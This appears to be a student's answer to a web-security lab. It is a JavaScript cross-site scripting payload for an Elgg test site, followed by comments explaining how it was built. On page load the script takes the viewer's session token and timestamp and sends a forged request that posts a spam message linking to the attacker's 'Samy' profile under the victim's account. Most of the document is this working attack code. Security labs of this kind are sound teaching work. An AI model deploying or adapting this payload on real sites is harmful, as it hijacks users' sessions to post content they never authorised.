<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
        var sendurl="/action/thewire/add"; //FILL IN
	var username = "&name="+elgg.session.user.name;
	var uid = "&guid="+elgg.session.user.guid;
	var isSamy = elgg.session.user.guid;
	var wirebody = "&body="+ encodeURIComponent("To earn 12 USD/Hour(!), visit now\n") + encodeURIComponent("http://www.xsslabelgg.com/profile/samy");

	var content=token+ts+wirebody//FILL IN
	
	if(isSamy !== 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		//Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
/*
	To construct the url, I checked in the firefox network tab how a normal POST rerquest for writng on the wire looks like. Then, I 		wrote the sendurl variable accordingly.
	To construct the content variable, I again checked the network tab and checked the Request Body portion. Then, I figured out where to 		place the ts and token.
	The Request Body also shows that it keeps the content of the wire in the body parameter. So, my wirebody variable uses that to 		construct the wire post.
	To find the url for Samy's profile, I looked at the browser url while we are at Samy's profile. 
	I checked if the user is Samy by checking the current guid is 47 or not.   
*/

